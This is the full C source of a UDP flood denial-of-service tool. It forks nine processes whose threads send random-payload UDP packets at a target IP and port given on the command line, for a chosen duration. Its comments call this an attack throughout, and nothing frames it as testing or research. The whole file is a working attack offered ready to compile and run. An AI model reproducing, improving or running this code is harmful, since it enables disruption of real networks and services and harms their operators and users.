#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <errno.h>  // Add this line

#define INSTANCE_COUNT 9  // Number of instances
#define SHM_NAME "/udp_flood_sync"  // Shared memory name
#define BUFFER_SIZE (64 * 1024 * 1024) // 64MB buffer size

// Structure to store attack parameters
typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
    time_t start_time;
} attack_params;

// Shared memory structure for synchronization
typedef struct {
    volatile int start_signal;
    volatile time_t attack_start_time;
} shared_memory;

// Global variables
volatile int keep_running = 1;

// Signal handler to stop the attack
void handle_signal(int signal) {
    keep_running = 0;
}

// Function to generate a random payload
void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = rand() % 256;  // Random byte between 0 and 255
    }
}

// Function to set socket to non-blocking
void set_non_blocking(int sock) {
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
}

// Function to perform the UDP flooding
void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char *message;

    // Create a UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    // Set socket to non-blocking mode
    set_non_blocking(sock);

    // Set up server address structure
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    if (server_addr.sin_addr.s_addr == INADDR_NONE) {
        fprintf(stderr, "Invalid IP address.\n");
        close(sock);
        return NULL;
    }

    // Allocate memory for the flooding message
    message = (char *)malloc(params->packet_size);
    if (message == NULL) {
        perror("Memory allocation failed");
        close(sock);
        return NULL;
    }

    // Generate random payload
    generate_random_payload(message, params->packet_size);

    // Time-bound attack loop
    time_t end_time = params->start_time + params->duration;
    while (time(NULL) < end_time && keep_running) {
        // Send the UDP packet
        if (sendto(sock, message, params->packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            // Non-blocking socket might return an error if the buffer is full, continue sending
            if (errno != EAGAIN && errno != EWOULDBLOCK) {
                perror("sendto failed");
                break;
            }
        }
    }

    free(message);
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    // Validate arguments
    if (argc != 6) {
        printf("Usage: %s [IP] [PORT] [TIME] [PACKET_SIZE] [TOTAL_THREAD_COUNT]\n", argv[0]);
        return EXIT_FAILURE;
    }

    // Parse input arguments
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int packet_size = atoi(argv[4]);
    int total_threads = atoi(argv[5]);

    if (packet_size <= 0 || total_threads <= 0) {
        fprintf(stderr, "Invalid packet size or thread count.\n");
        return EXIT_FAILURE;
    }

    // Setup signal handler
    signal(SIGINT, handle_signal);

    // Split thread count across instances
    int threads_per_instance = total_threads / INSTANCE_COUNT;
    if (threads_per_instance < 1) {
        fprintf(stderr, "Total threads must be at least %d to distribute properly.\n", INSTANCE_COUNT);
        return EXIT_FAILURE;
    }

    printf("Launching %d instances, each with %d threads...\n", INSTANCE_COUNT, threads_per_instance);

    // Create shared memory for synchronization
    int shm_fd = shm_open(SHM_NAME, O_CREAT | O_RDWR, 0666);
    ftruncate(shm_fd, sizeof(shared_memory));
    shared_memory *shm = mmap(0, sizeof(shared_memory), PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);

    // Initialize shared memory
    shm->start_signal = 0;
    shm->attack_start_time = 0;

    // Fork instances
    for (int i = 0; i < INSTANCE_COUNT; i++) {
        pid_t pid = fork();
        if (pid < 0) {
            perror("Fork failed");
            return EXIT_FAILURE;
        } else if (pid == 0) {
            // Child process (instance)
            pthread_t threads[threads_per_instance];
            attack_params params[threads_per_instance];

            // Wait until the start signal is set
            while (shm->start_signal == 0) {
                usleep(1000); // Small delay to prevent busy-waiting
            }

            printf("Instance %d started.\n", i);

            // Launch threads in this instance
            for (int j = 0; j < threads_per_instance; j++) {
                params[j].target_ip = target_ip;
                params[j].target_port = target_port;
                params[j].duration = duration;
                params[j].packet_size = packet_size;
                params[j].thread_id = j;
                params[j].start_time = shm->attack_start_time;

                if (pthread_create(&threads[j], NULL, udp_flood, &params[j]) != 0) {
                    fprintf(stderr, "Failed to create thread %d in instance %d\n", j, i);
                }
            }

            // Wait for all threads to finish
            for (int j = 0; j < threads_per_instance; j++) {
                pthread_join(threads[j], NULL);
            }

            printf("Instance %d finished.\n", i);
            exit(0);
        }
    }

    // Parent process: Set start signal and start time
    sleep(1); // Small delay to ensure all child processes are ready
    shm->attack_start_time = time(NULL);
    shm->start_signal = 1;

    // Wait for all child processes
    for (int i = 0; i < INSTANCE_COUNT; i++) {
        wait(NULL);
    }

    // Cleanup shared memory
    shm_unlink(SHM_NAME);

    printf("Attack finished. All instances stopped.\n");
    return EXIT_SUCCESS;
}